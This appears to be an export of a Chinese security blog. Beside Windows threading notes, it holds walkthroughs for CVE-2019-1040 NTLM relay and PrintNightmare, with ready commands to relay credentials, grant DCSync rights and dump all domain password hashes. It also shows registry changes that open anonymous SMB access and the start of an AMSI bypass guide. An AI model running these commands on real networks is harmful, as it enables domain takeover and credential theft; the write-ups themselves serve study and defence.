(_beginthreadex_proc_type)ThreadProex, NULL, 0, &amp;iThreadIdex);//他杀式结束线程//TerminateThread(hThreadex, 1);CloseHandle(hThreadex);system("pause");ExitProcess(1);return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){Redamancy coo(1, 2);//自杀式结束线程//ExitThread(1);return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){Redamancy coo(3, 4);//自杀式结束线程//_endthreadex(1);return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-编码篇(二) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-基础篇(二)</title>
      <link href="/2021/10/28/xian-cheng-ji-chu-pian-er/"/>
      <url>/2021/10/28/xian-cheng-ji-chu-pian-er/</url>
      
        <content type="html"><![CDATA[<h2 id="进程-线程优先级"><a href="#进程-线程优先级" class="headerlink" title="进程-线程优先级"></a>进程-线程优先级</h2><h2 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h2><pre class="line-numbers language-none"><code class="language-none">BOOL SetPriorityClass(    HANDLE hProcess,       //进程句柄    DWORD dwPriorityClass  //进程优先级);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320359.png" alt="image-20211124204803694"></p><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><pre class="line-numbers language-none"><code class="language-none">BOOL SetThreadPriority(    HANDLE hThread,  //线程句柄    int nPriority   //线程优先级);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320242.png" alt="image-20211124204846834"></p><h2 id="进程-线程组合优先级"><a href="#进程-线程组合优先级" class="headerlink" title="进程-线程组合优先级"></a>进程-线程组合优先级</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320933.png" alt="image-20211124204915221"></p><h2 id="设置进程优先级"><a href="#设置进程优先级" class="headerlink" title="设置进程优先级"></a>设置进程优先级</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320753.png" alt="image-20211124205042268"></p><p>注：<strong>操作系统会根据自己的算术进行自我调整，实现最优调度</strong></p><h2 id="锁定优先级"><a href="#锁定优先级" class="headerlink" title="锁定优先级"></a>锁定优先级</h2><h3 id="锁定进程优先级"><a href="#锁定进程优先级" class="headerlink" title="锁定进程优先级"></a>锁定进程优先级</h3><pre class="line-numbers language-none"><code class="language-none">BOOL SetProcessPriorityBoost(    HANDLE hProcess, //进程句柄    BOOL DisablePriorityBoost  //设置为true或false);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>true：不允许操作系统自己调整调度优先级</p><p>false：允许操作系统自己调整调度优先级</p><h3 id="锁定线程优先级"><a href="#锁定线程优先级" class="headerlink" title="锁定线程优先级"></a>锁定线程优先级</h3><pre class="line-numbers language-none"><code class="language-none">BOOL SetThreadPriorityBoost(    HANDLE hThread,  //线程句柄    BOOL DisablePriorityBoost  //设置为true或false);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-基础篇(二) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-1040</title>
      <link href="/2021/10/28/2019-1040/"/>
      <url>/2021/10/28/2019-1040/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>漏洞检测：<a href="https://github.com/fox-it/cve-2019-1040-scanner">https://github.com/fox-it/cve-2019-1040-scanner</a></p><p>漏洞利用：<a href="https://github.com/Ridter/CVE-2019-1040">https://github.com/Ridter/CVE-2019-1040</a></p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 7 sp1 至Windows 10 1903</p><p>Windows Server 2008 至Windows Server 2019</p><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>对于特定环境， CVE-2019-1040漏洞的攻击链目前已经确定的两种攻击途径：</p><p>1、攻击域Exchange Server</p><p>2、攻击域AD Server</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="攻击方式一：Exchange"><a href="#攻击方式一：Exchange" class="headerlink" title="攻击方式一：Exchange"></a>攻击方式一：Exchange</h3><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><pre class="line-numbers language-none"><code class="language-none">1.使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误2.目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP3.使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限4.攻击者帐户使用DCSync转储AD中的所有密码哈希值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-执行ntlmrelayx-py"><a href="#1-执行ntlmrelayx-py" class="headerlink" title="1.执行ntlmrelayx.py"></a>1.执行ntlmrelayx.py</h4><p>进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议</p><pre class="line-numbers language-none"><code class="language-none">python ntlmrelayx.py --escalate-user WIN7User -t ldap://AD.syst1m.local -smb2support --remove-mic --delegate-access<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：其中<code>--remove-mic</code>选项用于清除MIC标志</p><p><code>--escalate-user</code>用于提升指定用户权限</p><h4 id="2-执行printerbug-py"><a href="#2-执行printerbug-py" class="headerlink" title="2.执行printerbug.py"></a>2.执行printerbug.py</h4><p>触发SpoolService的bug</p><pre class="line-numbers language-none"><code class="language-none">python printerbug.py 域/用户名:密码@打印机服务ip 回连ipproxychains4 python printerbug.py syst1m.local/WIN7User:win7user521.@192.168.1.104 192.168.1.102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>SpoolService的bug导致Exchange服务器回连到<code>ntlmrelayx.py</code>，即将认证信息发送到ntlmrelayx.py</p><h4 id="3-执行secretsdump-py"><a href="#3-执行secretsdump-py" class="headerlink" title="3.执行secretsdump.py"></a>3.执行secretsdump.py</h4><p>进行去dcsync功能dump出所有密码哈希值</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">secretsdump.py syst1m.local/WIN7User@syst1m.local -just-dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="CVE-2019-1040一键化脚本"><a href="#CVE-2019-1040一键化脚本" class="headerlink" title="CVE-2019-1040一键化脚本"></a>CVE-2019-1040一键化脚本</h4><p>来自evi1cg师傅写的利用工具</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">https://github.com/Ridter/CVE-2019-1040<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h5><pre class="line-numbers language-text" data-language="text"><code class="language-text">python CVE-2019-1040.py [-h] [-u USERNAME] [-d DOMAIN] [-p PASSWORD]                        [--hashes HASHES] [--smb-port [destination port]] -ah                        ATTACKER_HOST [-ap ATTACKER_PORT] -th TARGET_HOST                        [-t TIMEOUT]                        [--exec-method [{smbexec,wmiexec,mmcexec}]]                        [--just-dc-user USERNAME] [--debug]                        EX_HOSTNAMEpython CVE-2019-1040.py -ah 192.168.1.100 -u 'WIN7User' -p 'win7user521.' -d 'syst1m.local' -th 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="攻击方式二：Kerberos委派"><a href="#攻击方式二：Kerberos委派" class="headerlink" title="攻击方式二：Kerberos委派"></a>攻击方式二：Kerberos委派</h3><h3 id="工作流程-1"><a href="#工作流程-1" class="headerlink" title="工作流程"></a>工作流程</h3><pre class="line-numbers language-none"><code class="language-none">1.使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误2.目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP3.使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户4.攻击者作为受害者服务器上的任何用户进行身份验证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-执行ntlmrelayx-py-1"><a href="#1-执行ntlmrelayx-py-1" class="headerlink" title="1.执行ntlmrelayx.py"></a>1.执行ntlmrelayx.py</h4><p>使用–delegate-access选项，delegate-access选项将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。</p><p> attacker对辅助域控制器(SDC)执行printerbug.py脚本</p><h4 id="2-执行printerbug-py-1"><a href="#2-执行printerbug-py-1" class="headerlink" title="2.执行printerbug.py"></a>2.执行printerbug.py</h4><p>attacker对辅助域控制器(SDC)执行printerbug.py脚本</p><h4 id="3-执行getSP-py脚本"><a href="#3-执行getSP-py脚本" class="headerlink" title="3.执行getSP.py脚本"></a>3.执行getSP.py脚本</h4><p>通过<code>-impersonate</code>参数模拟用户admin请求其票证，保存为ccache</p><p>admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限</p><h4 id="4-执行secretsdump-py"><a href="#4-执行secretsdump-py" class="headerlink" title="4.执行secretsdump.py"></a>4.执行secretsdump.py</h4><p>进行去dcsync功能dump出所有密码哈希值</p>]]></content>
      
      
      <categories>
          
          <category> 打域控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2019-1040 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-1675&amp;&amp;CVE-2021-34527</title>
      <link href="/2021/10/28/2021-1675-2021-34527/"/>
      <url>/2021/10/28/2021-1675-2021-34527/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Print-Spooler-远程代码执行漏洞"><a href="#Windows-Print-Spooler-远程代码执行漏洞" class="headerlink" title="Windows Print Spooler 远程代码执行漏洞"></a>Windows Print Spooler 远程代码执行漏洞</h1><h1 id="CVE-2021-1675"><a href="#CVE-2021-1675" class="headerlink" title="CVE-2021-1675"></a>CVE-2021-1675</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过Process Moniter抓取到EXP加载DLL时，执行过程中的堆栈调用。</p><p>漏洞点在于，调用<code>YAddPrinterDriverEx</code>函数时，没有对参数<code>dwFileCopyFlags</code>做校验</p><p>能够使用APD_INSTALL_WARNED_DRIVER标志，导致后面对驱动合法性校验失效，可以任意的加载DLL，并且为system权限</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>1.2008版本的pDriverPath为</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_neutral_4616c3de1949be6d\Amd64\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.提权exp如下版本可以成功</p><pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2012 R2 Datacenter [版本 6.3.9600]Microsoft Windows 10 专业版 [版本 10.0.19041.685]Microsoft Windows Server 2008 R2 Enterprise [版本 6.1.7601]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="域环境配置"><a href="#域环境配置" class="headerlink" title="域环境配置"></a>域环境配置</h3><p>域控（server2019 /2016）</p><p>192.168.153.149</p><p>Administrator</p><p>密码：Woshiyukong!!</p><p>目录还原模式密码Qwe123456</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//clipboard.png" alt="img"></p><p>用户机器</p><p>192.168.153.200</p><p>用户testuser</p><p>密码Woshicom123456</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210706175436.png" alt="img"></p><p>smb win10机器</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210707131152.png" alt="image-20210707131152801"></p><p>域控开启服务。Print spooler，同时为system权限</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//image-20210706175245429.png" alt="image-20210706175245429"></p><p>需要使用作者提供的impacket ，其他版本会报错</p><p>kali ，linux 下安装不会报错，windows安装报错</p><pre class="line-numbers language-none"><code class="language-none">pip3 uninstall impacketgit clone https://github.com.cnpmjs.org/cube0x0/impacketcd impacketsudo python3 ./setup.py install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210707135031.png" alt="image-20210707135031710"></p><p>此时我们需要这样修理</p><pre class="line-numbers language-none"><code class="language-none">pip install impacket==0.9.24.dev1 -i https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>换源强制安装</p><p>python  3.6.5下成功运行 </p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210707140609.png" alt="image-20210707140609890"></p><pre class="line-numbers language-none"><code class="language-none">Impacket是一个Python类库，用于对SMB1-3或IPv4 / IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接开启windows10 的smb共享服务，能够访问即可</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210706200111.png" alt="image-20210706200111192"></p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210707131100.png" alt="image-20210707131100591"></p><p>（如下为域内机器访问情况）</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210706195955.png" alt="image-20210706195955012"></p><p>如果出现域控无法访问smb服务的情况</p><p>需要将域控注册表中 允许匿名用户访问打开</p><h3 id="windows下开启匿名服务"><a href="#windows下开启匿名服务" class="headerlink" title="windows下开启匿名服务"></a>windows下开启匿名服务</h3><p>具体详细SMB设置如下</p><p>Powershell admin打开，执行以下语句，即完成所有配置</p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210706202648.png" alt="image-20210706202648815"></p><pre class="line-numbers language-none"><code class="language-none">windows下mkdir C:\shareicacls C:\share\ /T /grant "ANONYMOUS LOGON":ricacls C:\share\ /T /grant Everyone:rNew-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /fREG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /fREG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /fREG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f执行完以上语句后，部分机器需要重启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>及时更新组策略</p><pre class="line-numbers language-none"><code class="language-none">gpupdate /force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="linux下开启smb匿名服务"><a href="#linux下开启smb匿名服务" class="headerlink" title="linux下开启smb匿名服务"></a>linux下开启smb匿名服务</h3><p>配置/etc/samba/smb.conf</p><pre class="line-numbers language-none"><code class="language-none">[global]map to guest = Bad Userserver role = standalone serverusershare allow guests = yessmb ports = 445idmap config * :backend = tdb[smb]comment = Sambapath = /tmp/guest ok = yesread only = nobrowsable = yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置完成后需要重启smb服务</p><pre class="line-numbers language-none"><code class="language-none">sudo service smbd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="kali发起攻击"><a href="#kali发起攻击" class="headerlink" title="kali发起攻击"></a>kali发起攻击</h2><pre class="line-numbers language-none"><code class="language-none">python3 CVE-2021-1675.py 域名/域普通用户:用户密码@域控IP   smb共享文件的路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210707125946.png" alt="image-20210707125946583"></p><p><img src="https://gitee.com/dingpengs/image/raw/master/imgwin//20210707131543.png" alt="image-20210707131543775"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>漏洞分析见</p><p><a href="http://noahblog.360.cn/cve-2021-1675/">http://noahblog.360.cn/cve-2021-1675/</a></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>本地提权</p><p>官方的修复只是针对了本地提权的修复，而远程的调用并没有被考虑</p><h1 id="CVE-2021-34527"><a href="#CVE-2021-34527" class="headerlink" title="CVE-2021-34527"></a>CVE-2021-34527</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击者可以通过该漏洞绕过PfcAddPrinterDriver的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。</p><p>利用该0day漏洞，攻击者可以使用一个低权限用户（包括匿名共享guest账户），对本地网络中的电脑发起攻击，控制存在漏洞的电脑。尤其在企业内部，在域环境中，普通域用户，可以通过该服务，攻击域控服务器，从而控制整个网络。该漏洞广泛的存在于各Windows版本中，利用复杂度低，所以该漏洞的利用价值极高。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>同样通过process moniter抓取mimikatz中CVE-2021-34527的EXP执行数据，加载DLL的堆栈调用</p><p>通过地址可以找到，spoolsv.exe的调用的处理函数为<code>NThreadingLibrary::TWorkCrew::tpSimpleCallback</code></p><p>继续调用<code>TFunction4&lt;unsigned short *,_DRIVER_CONTAINER *,unsigned  long,enum  Call_Route&gt;::Run(__int64  a1)</code>函数，最后调用<code>YAddPrinterDriverEx</code></p><p>由此可知CVE-2021-34527和CVE-2021-1675，最终都是调用YAddPrinterDriverEx函数，只是RPC调用不同，所以可以说这个漏洞是CVE-2021-1675的补丁绕过。引发思考，如果再有不同RPC调用了YAddPrinterDriverEx函数，也是能绕过CVE-2021-1675补丁的。</p><h2 id="漏洞维护"><a href="#漏洞维护" class="headerlink" title="漏洞维护"></a>漏洞维护</h2><p><strong>官方升级</strong>（只针对本地提权修复）</p><p><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675</a></p><p><strong>rce临时防护措施</strong></p><p>services.msc 中禁用Print Spooler服务</p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul><li><p>Windows Server 2012 R2 (Server Core installation)</p></li><li><p>Windows Server 2012 R2</p></li><li><p>Windows Server 2012 (Server Core installation)</p></li><li><p>Windows Server 2012</p></li><li><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p></li><li><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p></li><li><p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p></li><li><p>Windows Server 2008 for x64-based Systems Service Pack 2</p></li><li><p>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</p></li><li><p>Windows Server 2008 for 32-bit Systems Service Pack 2</p></li><li><p>Windows RT 8.1</p></li><li><p>Windows 8.1 for x64-based systems</p></li><li><p>Windows 8.1 for 32-bit systems</p></li><li><p>Windows 7 for x64-based Systems Service Pack 1</p></li><li><p>Windows 7 for 32-bit Systems Service Pack 1</p></li><li><p>Windows Server 2016 (Server Core installation)</p></li><li><p>Windows Server 2016</p></li><li><p>Windows 10 Version 1607 for x64-based Systems</p></li><li><p>Windows 10 Version 1607 for 32-bit Systems</p></li><li><p>Windows 10 for x64-based Systems</p></li><li><p>Windows 10 for 32-bit Systems</p></li><li><p>Windows Server, version 20H2 (Server Core Installation)</p></li><li><p>Windows 10 Version 20H2 for ARM64-based Systems</p></li><li><p>Windows 10 Version 20H2 for 32-bit Systems</p></li><li><p>Windows 10 Version 20H2 for x64-based Systems</p></li><li><p>Windows Server, version 2004 (Server Core installation)</p></li><li><p>Windows 10 Version 2004 for x64-based Systems</p></li><li><p>Windows 10 Version 2004 for ARM64-based Systems</p></li><li><p>Windows 10 Version 2004 for 32-bit Systems</p></li><li><p>Windows 10 Version 21H1 for 32-bit Systems</p></li><li><p>Windows 10 Version 21H1 for ARM64-based Systems</p></li><li><p>Windows 10 Version 21H1 for x64-based Systems</p></li><li><p>Windows 10 Version 1909 for ARM64-based Systems</p></li><li><p>Windows 10 Version 1909 for x64-based Systems</p></li><li><p>Windows 10 Version 1909 for 32-bit Systems</p></li><li><p>Windows Server 2019 (Server Core installation)</p></li><li><p>Windows Server 2019</p></li><li><p>Windows 10 Version 1809 for ARM64-based Systems</p></li><li><p>Windows 10 Version 1809 for x64-based Systems</p></li><li><p>Windows 10 Version 1809 for 32-bit Systems</p></li></ul><h2 id="两者对比"><a href="#两者对比" class="headerlink" title="两者对比"></a>两者对比</h2><p>CVE-2021-34527和CVE-2021-1675，<strong>最终都是调用YAddPrinterDriverEx函数，只是RPC调用不同</strong></p><p><strong>CVE-2021-34527这个漏洞是CVE-2021-1675的补丁绕过</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://support.microsoft.com/zh-cn/topic/july-6-2021-kb5004945-os-builds-19041-1083-19042-1083-and-19043-1083-out-of-band-44b34928-0a71-4473-aa22-ecf3b83eed0e">https://support.microsoft.com/zh-cn/topic/july-6-2021-kb5004945-os-builds-19041-1083-19042-1083-and-19043-1083-out-of-band-44b34928-0a71-4473-aa22-ecf3b83eed0e</a></p><p><a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p><p><a href="https://github.com/afwu/PrintNightmare">https://github.com/afwu/PrintNightmare</a></p><p><a href="http://noahblog.360.cn/cve-2021-1675/">http://noahblog.360.cn/cve-2021-1675/</a></p><p><a href="https://github.com/cube0x0/impacket">https://github.com/cube0x0/impacket</a></p><p><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></p><p><a href="https://github.com/hlldz/CVE-2021-1675-LPE">https://github.com/hlldz/CVE-2021-1675-LPE</a></p><p><a href="https://github.com/evilashz/CVE-2021-1675-LPE-EXP">https://github.com/evilashz/CVE-2021-1675-LPE-EXP</a></p>]]></content>
      
      
      <categories>
          
          <category> 打域控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-1675&amp;&amp;CVE-2021-34527 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AMSI对抗小结</title>
      <link href="/2021/10/28/amsi-dui-kang/"/>
      <url>/2021/10/28/amsi-dui-kang/</url>
      
        <content type="html"><![CDATA[<h1 id="AMSI对抗小结"><a href="#AMSI对抗小结" class="headerlink" title="AMSI对抗小结"></a>AMSI对抗小结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>AMSI是微软用来对抗无文件攻击而开发的安全模块，是当前攻防对抗前沿的技术 之一</p><p>从15年AMSI出现，越来越多的杀软厂商接入了AMSI接口，当前市面上主流杀软均接入此接口</p><p>这给当时以powershell为主的红队工具致命打击，像Empire，等等</p><p>总体来说，由于AMSI仅仅是一个连接应用程序和杀软程序的通道，微软主要还是在defender上做各种对抗，针对通道本身的加固较少。</p><p>红队工具也寻找了另外一条出路就是.Net，使用C#开发的红队工具随之兴起。</p><p> 随着以<code>.NET</code>(C#)为基础的攻击技术的逐渐成熟</p><p>AMSI在<code>.NET 4.8</code>引入了针对Assembly导入的内存扫描， 同时针对WMI的扫描也被加入到了AMSI当中</p><h2 id="什么是AMSI"><a href="#什么是AMSI" class="headerlink" title="什么是AMSI"></a>什么是AMSI</h2><p>AMSI全称(Antimalware Scan Interface)，反恶意软件扫描接口，他的本体是一个DLL文件</p><p>默认位置：<code>c:\windows\system32\amsi.dll</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233123.png" alt="image-20211016161926115"></p><p>它提供了通用的标准接口（COM接口、Win32 API）</p><p>这些接口中 Win32 API是为正常应用程序提供的，方便正常程序调用这些API针对用户输入做扫描。</p><p>COM接 口，是为杀软供应商提供的，方便杀软厂商接入自身针对恶意软件的识别能力</p><h2 id="WIN32-API"><a href="#WIN32-API" class="headerlink" title="WIN32 API"></a>WIN32 API</h2><pre class="line-numbers language-none"><code class="language-none">AmsiCloseSession     关闭由 AmsiOpenSession 打开的会话。AmsiInitialize         初始化 AMSI API。AmsiNotifyOperation 向反恶意软件提供程序发送任意操作的通知。AmsiOpenSession     打开可在其中关联多个扫描请求的会话。AmsiResultIsMalware 确定扫描结果是否指示应阻止内容。AmsiScanBuffer         扫描缓冲区中的内容中寻找恶意软件。AmsiScanString         扫描字符串中的恶意软件。AmsiUninitialize     删除 AmsiInitialize最初打开的 AMSI API 实例。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注<code>AmsiScanBuffer、AmsiScanString、AmsiUacScan</code>这三个函数</p><h2 id="AMSI在Windows中的作用"><a href="#AMSI在Windows中的作用" class="headerlink" title="AMSI在Windows中的作用"></a>AMSI在Windows中的作用</h2><p>AMSI在windows系统中被直接或间接的调用，主要分布在以下程序</p><p>1.<code>用户账户控制</code>，也就是UAC（EXE、COM、MSI、ActiveX的安装） </p><pre class="line-numbers language-none"><code class="language-none">%windir%\System32\consent.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.<code>Powershell</code>（脚本、交互式使用、动态代码求值） </p><pre class="line-numbers language-none"><code class="language-none">System.Management.Automation.dll <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.<code>Windows脚本宿主</code> </p><pre class="line-numbers language-none"><code class="language-none">wscript.exe cscript.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.<code>JavaScript、VBScript</code> </p><pre class="line-numbers language-none"><code class="language-none">%windir%\System32\jscript.dll %windir%\System32\vbscript.dll <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.<code>Office VBA macros</code> </p><pre class="line-numbers language-none"><code class="language-none">VBE7.dll <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.<code>.NET Assembly</code> </p><pre class="line-numbers language-none"><code class="language-none">clr.dll <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.<code>WMI</code> </p><pre class="line-numbers language-none"><code class="language-none">%windir%\System32\wbem\fastprox.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Bypass-AMSI-1"><a href="#Bypass-AMSI-1" class="headerlink" title="Bypass AMSI-1"></a>Bypass AMSI-1</h2><h3 id="降级攻击"><a href="#降级攻击" class="headerlink" title="降级攻击"></a>降级攻击</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>简单来说 使用低版本(2.0)的PowerShell来执行攻击脚本，因为在低版本的 powershell上没有AMSI</p><h4 id="预装情况"><a href="#预装情况" class="headerlink" title="预装情况"></a>预装情况</h4><p><a href="https://4sysops.com/wiki/differences-between-powershell-versions">https://4sysops.com/wiki/differences-between-powershell-versions</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110162233124.png" alt="image-20211016155905112"></p><p>AMSI是在Win10、 WinServer2016开始使用的</p><h4 id="判断使用"><a href="#判断使用" class="headerlink" title="判断使用"></a>判断使用</h4><p>我们需要在使用前自己探测是否可以使用</p><pre class="line-numbers language-none"><code class="language-none">注:非管理员权限Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | GetItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version注：需要管理员权限Win10:Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Win2016/Win2019:Get-WindowsFeature PowerShell-V2<span aria-hidden="true" 